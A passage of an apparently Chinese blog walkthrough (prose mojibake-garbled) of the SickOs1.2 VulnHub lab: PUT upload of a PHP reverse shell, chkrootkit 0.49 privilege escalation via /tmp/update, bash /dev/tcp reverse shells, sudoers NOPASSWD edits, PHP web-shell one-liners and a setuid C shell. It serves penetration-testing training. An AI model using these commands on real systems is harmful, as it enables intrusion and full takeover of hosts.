æ–‡ä»¶å’Œæ•°æ®ï¼Œéƒ½æ²¡æœ‰æˆåŠŸã€‚</p><p>ä½¿ç”¨ curl æ¢æµ‹ä¸€ä¸‹ test ç›®å½•å¯ç”¨çš„ http æ–¹æ³•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -X OPTIONS http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> OPTIONS /<span class="hljs-built_in">test</span>/ HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 OK<br>&lt; DAV: 1,2<br>&lt; MS-Author-Via: DAV<br>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK<br>&lt; Allow: OPTIONS, GET, HEAD, POST<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 16:29:47 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br></code></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥ç”¨ put ä½œä¸ºè¯·æ±‚æ–¹å¼ï¼Œå°è¯•ä¸Šä¼ æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -T php-reverse-shell.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/php-reverse-shell.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 5497</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Expect: 100-continue</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 417 Expectation Failed<br>&lt; Content-Type: text/html<br>&lt; Content-Length: 363<br>&lt; Connection: close<br>&lt; Date: Mon, 04 Jul 2022 17:35:25 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;<br>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;<br>         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;<br> &lt;head&gt;<br>  &lt;title&gt;417 - Expectation Failed&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br>* Closing connection 0<br></code></pre></td></tr></table></figure><p>ç”±äº curl ä¼šå‘é€ä¸€ä¸ªå¸¦ Expect å¤´çš„æŠ¥æ–‡ï¼Œè€Œ lighttpd ä¸æ”¯æŒè¿™ä¸ªå¤´ï¼Œå› æ­¤æ— æ³•ä¸Šä¼ æˆåŠŸã€‚</p><p>æ·»åŠ å¤´ä¿¡æ¯ï¼Œå°†å…¶è®¾ç½®ä¸ºç©ºï¼ŒæˆåŠŸä¸Šä¼ ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T php-reverse-shell.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/php-reverse-shell.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 5497</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 17:36:39 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br></code></pre></td></tr></table></figure><p>kali ç›‘å¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span>            <br>listening on [any] 1234 ...<br><br>WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110)<br></code></pre></td></tr></table></figure><p>ä¸€ç›´ç›‘å¬ä¸åˆ°ï¼Œå°è¯•æ›´æ¢ç«¯å£ï¼Œæœ€åç«¯å£è®¾ä¸º 8080 æ—¶æˆåŠŸç›‘å¬åˆ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 8080</span><br>listening on [any] 8080 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.154] 49867<br>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux<br> 10:44:46 up  1:47,  0 users,  load average: 0.00, 0.02, 0.05<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>æŸ¥æ‰¾ SUIDï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span>                                              <br>/usr/sbin/pppd<br>/usr/sbin/uuidd<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/pt_chown<br>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/bin/sudoedit<br>/usr/bin/traceroute6.iputils<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/at<br>/usr/bin/mtr<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/bin/mount<br>/bin/ping6<br>/bin/fusermount<br>/bin/umount<br>/bin/ping<br>/bin/su<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼Œå‘ç°äº† Chkrootkitï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /etc</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l | grep cron</span><br>drwx------ 2 root root    4096 Apr 12  2016 cron.d<br>drwxr-xr-x 2 root root    4096 Apr 12  2016 cron.daily<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.hourly<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.monthly<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.weekly<br>-rw-r--r-- 1 root root     722 Jun 19  2012 crontab<br><span class="hljs-meta">$</span><span class="bash"> ls -l cron.daily</span>    <br>total 60<br>-rwxr-xr-x 1 root root 15399 Nov 15  2013 apt<br>-rwxr-xr-x 1 root root   314 Apr 18  2013 aptitude<br>-rwxr-xr-x 1 root root   502 Mar 31  2012 bsdmainutils<br>-rwxr-xr-x 1 root root  2032 Jun  4  2014 chkrootkit<br>-rwxr-xr-x 1 root root   256 Oct 14  2013 dpkg<br>-rwxr-xr-x 1 root root   338 Dec 20  2011 lighttpd<br>-rwxr-xr-x 1 root root   372 Oct  4  2011 logrotate<br>-rwxr-xr-x 1 root root  1365 Dec 28  2012 man-db<br>-rwxr-xr-x 1 root root   606 Aug 17  2011 mlocate<br>-rwxr-xr-x 1 root root   249 Sep 12  2012 passwd<br>-rwxr-xr-x 1 root root  2417 Jul  1  2011 popularity-contest<br>-rwxr-xr-x 1 root root  2947 Jun 19  2012 standard<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ Chkrootkit ç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chkrootkit -V</span><br>chkrootkit version 0.49<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit chkrootkit</span>   <br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Chkrootkit - Local Privilege Escalation (Metasploit)                      | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                              | linux/local/33899.txt<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/33899.txt</span>                   <br>We just found a serious vulnerability in the chkrootkit package, which<br>may allow local attackers to gain root access to a box in certain<br>configurations (/tmp not mounted noexec).<br><br>The vulnerability is located in the function slapper() in the<br>shellscript chkrootkit:<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-function"><span class="hljs-title">slapper</span></span> ()&#123;</span><br>   SLAPPER_FILES=&quot;$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c&quot;<br>   SLAPPER_FILES=&quot;$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \<br><span class="hljs-meta">   $</span><span class="bash">&#123;ROOTDIR&#125;tmp/update <span class="hljs-variable">$&#123;ROOTDIR&#125;</span>tmp/.cinik <span class="hljs-variable">$&#123;ROOTDIR&#125;</span>tmp/.b<span class="hljs-string">&quot;a</span></span><br>   SLAPPER_PORT=&quot;0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 &quot;<br>   OPT=-an<br>   STATUS=0<br>   file_port=<br><br>   if $&#123;netstat&#125; &quot;$&#123;OPT&#125;&quot;|$&#123;egrep&#125; &quot;^tcp&quot;|$&#123;egrep&#125; &quot;$&#123;SLAPPER_PORT&#125;&quot;&gt;<br>/dev/null 2&gt;&amp;1<br>      then<br>      STATUS=1<br>      [ &quot;$SYSTEM&quot; = &quot;Linux&quot; ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \<br>         $egrep ^tcp|$egrep &quot;$&#123;SLAPPER_PORT&#125;&quot; | $&#123;awk&#125; &#x27;&#123; print  $7 &#125;&#x27; |<br>tr -d :`<br>   fi<br>   for i in $&#123;SLAPPER_FILES&#125;; do<br>      if [ -f $&#123;i&#125; ]; then<br>         file_port=$file_port $i<br>         STATUS=1<br>      fi<br>   done<br>   if [ $&#123;STATUS&#125; -eq 1 ] ;then<br>      echo &quot;Warning: Possible Slapper Worm installed ($file_port)&quot;<br>   else<br>      if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;not infected&quot;; fi<br>         return $&#123;NOT_INFECTED&#125;<br>   fi<br>&#125;<br><br><br>The line &#x27;file_port=$file_port $i&#x27; will execute all files specified in<br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-string">SLAPPER_FILES as the user chkrootkit is running (usually root), if</span></span><br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-string">file_port is empty, because of missing quotation marks around the</span></span><br>variable assignment.<br><br>Steps to reproduce:<br><br>- Put an executable file named &#x27;update&#x27; with non-root owner in /tmp (not<br>mounted noexec, obviously)<br>- Run chkrootkit (as uid 0)<br><br>Result: The file /tmp/update will be executed as root, thus effectively<br>rooting your box, if malicious content is placed inside the file.<br><br>If an attacker knows you are periodically running chkrootkit (like in<br>cron.daily) and has write access to /tmp (not mounted noexec), he may<br>easily take advantage of this.<br><br>Suggested fix: Put quotation marks around the assignment.<br><br>file_port=&quot;$file_port $i&quot;<br><br>I will also try to contact upstream, although the latest version of<br>chkrootkit dates back to 2009 - will have to see, if I reach a dev there.<br></code></pre></td></tr></table></figure><p>æ ¹æ®è„šæœ¬æè¿°ï¼Œç›®æ ‡é¶æœºçš„ Chkrootkit ä¼šå‘¨æœŸæ€§ä»¥ root èº«ä»½æ‰§è¡Œ <code>/tmp/update</code> æ–‡ä»¶ ã€‚</p><p>æŸ¥çœ‹ tmp ç›®å½•æ˜¯å¦å¯æ‰§è¡Œï¼Œåˆ›å»º  <code>/tmp/update</code> æ–‡ä»¶ï¼Œç”¨äºå°†å½“å‰ç”¨æˆ·å†™å…¥ <code>/etc/sudoers</code> æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥ sudoææƒäº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l / | grep tmp</span>      <br>drwxrwxrwt   4 root root  4096 Jul  4 10:54 tmp<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/update</span><br>chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers<br></code></pre></td></tr></table></figure><p>ç„¶åä¸æˆåŠŸï¼Œæ¢æˆ bash åå¼¹ä¾æ—§ä¸è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo su</span><br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: no tty present and no askpass program specified<br>Sorry, try again.<br>sudo: 3 incorrect password attempts<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.135.141/443 0&gt;&amp;1\n&#x27;</span> &gt; /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/update</span><br><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.135.141/8080 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>åœ¨æŠ˜è…¾å¥½ä¹…ä¹‹åå‘ç° <code>/tmp/update</code> æ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œå±…ç„¶çŠ¯äº†è¿™ç§ä½çº§é”™è¯¯ï¼ŒåŠ äº†æƒé™åæˆåŠŸè¿›å…¥ root ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l /tmp/update</span><br>-rw-rw-rw- 1 www-data www-data 81 Jul  4 11:19 /tmp/update<br><span class="hljs-meta">$</span><span class="bash"> chmod +x /tmp/update</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l /tmp/update</span><br>-rwxrwxrwx 1 www-data www-data 81 Jul  4 11:19 /tmp/update<br><span class="hljs-meta">$</span><span class="bash"> sudo su</span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">$</span><span class="bash"> ls /root</span><br>304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz<br>7d03aaa2bf93d80040f3f22ec6ad9d5a.txt<br>chkrootkit-0.49<br>newRule<br><span class="hljs-meta">$</span><span class="bash"> cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br>WoW! If you are viewing this, You have &quot;Sucessfully!!&quot; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.<br><br>Thanks for giving this try.<br><br>@vulnhub: Thanks for hosting this UP!.<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€PUT æ–¹å¼æ–‡ä»¶ä¸Šä¼ ï¼šcurl</p><p>2ã€åå¼¹ shell ç«¯å£å—é™ï¼Œå¯ä»¥å°è¯•æ›´æ¢å¸¸ç”¨ç«¯å£</p><p>3ã€è®¡åˆ’ä»»åŠ¡ï¼š<code>ls -l /etc | grep cron</code></p><p>4ã€Chkrootkit ææƒï¼šè¿½åŠ å½“å‰ç”¨æˆ·è‡³ sudoer ï¼Œsudo ææƒ</p><h2 id="äº”ã€Others"><a href="#äº”ã€Others" class="headerlink" title="äº”ã€Others"></a>äº”ã€Others</h2><h3 id="1ã€PUT-æ–¹æ³•ä¸Šä¼ "><a href="#1ã€PUT-æ–¹æ³•ä¸Šä¼ " class="headerlink" title="1ã€PUT æ–¹æ³•ä¸Šä¼ "></a>1ã€PUT æ–¹æ³•ä¸Šä¼ </h3><p><strong>M1ï¼šé€šè¿‡ burpsuite ä½¿ç”¨ PUT æ–¹æ³•ä¸Šä¼ </strong></p><p>æŠ“åŒ… â€”&gt; æ›´æ”¹ä¸º PUT è¯·æ±‚ã€æ·»åŠ ä¸€å¥è¯æœ¨é©¬ â€”&gt; ä¸Šä¼ æˆåŠŸ</p><p><strong>M2ï¼šé€šè¿‡ nmap ä½¿ç”¨ PUT æ–¹æ³•ä¸Šä¼ </strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -p 80 192.168.202.13 --script http-put --script-args http-put.url=<span class="hljs-string">&#x27;/test/shell.php&#x27;</span>,http-put.file=<span class="hljs-string">&#x27;/home/kali/shell.php&#x27;</span></span><br></code></pre></td></tr></table></figure><p><strong>M3ï¼šé€šè¿‡ curl å‘½ä»¤ä½¿ç”¨ PUT æ–¹æ³•ä¸Šä¼ </strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -X PUT -d <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> http://192.168.135.154/<span class="hljs-built_in">test</span>/shell1.php</span><br><span class="hljs-meta">$</span><span class="bash"> curl -i -X PUT -H <span class="hljs-string">&quot;Content-Type: text/plain; charset=utf-8&quot;</span> -d <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> http://192.168.135.154/<span class="hljs-built_in">test</span>/shell2.php</span><br><span class="hljs-meta">$</span><span class="bash"> curl -v --upload-file shell.php --url http://192.168.202.13/<span class="hljs-built_in">test</span>/shell1.php -0 --http1.0</span><br><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T shell.php http://192.168.202.13/<span class="hljs-built_in">test</span>/</span><br></code></pre></td></tr></table></figure><h3 id="2ã€ææƒ"><a href="#2ã€ææƒ" class="headerlink" title="2ã€ææƒ"></a>2ã€ææƒ</h3><p><strong>M1ï¼šbash åå¼¹</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/192.168.135.141/443 0&gt;&amp;1\n&#x27;</span> &gt; /tmp/update</span><br></code></pre></td></tr></table></figure><p>ç„¶åç›‘å¬ 8080 ç«¯å£å°±å¯ä»¥å¾—åˆ° root æƒé™çš„ shell ã€‚</p><p><strong>M2ï¼šè¿½åŠ å½“å‰ç”¨æˆ·è‡³ sudoer </strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br></code></pre></td></tr></table></figure><p><strong>M3ï¼šC</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>system(<span class="hljs-string">&quot;chown root:root /tmp/update&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod 4755 /tmp/update&quot;</span>);<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;sh&quot;</span>,<span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3ã€chkrootkit"><a href="#3ã€chkrootkit" class="headerlink" 